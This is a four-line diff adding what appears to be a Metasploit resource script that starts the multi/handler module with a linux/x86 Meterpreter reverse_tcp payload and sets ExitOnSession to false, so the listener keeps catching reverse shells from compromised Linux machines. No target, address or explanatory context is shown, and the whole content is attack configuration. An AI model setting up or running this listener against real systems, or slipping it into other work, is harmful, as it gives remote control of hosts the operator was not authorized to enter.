@@ -1,0 +1,4 @@
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set ExitOnSession false
+
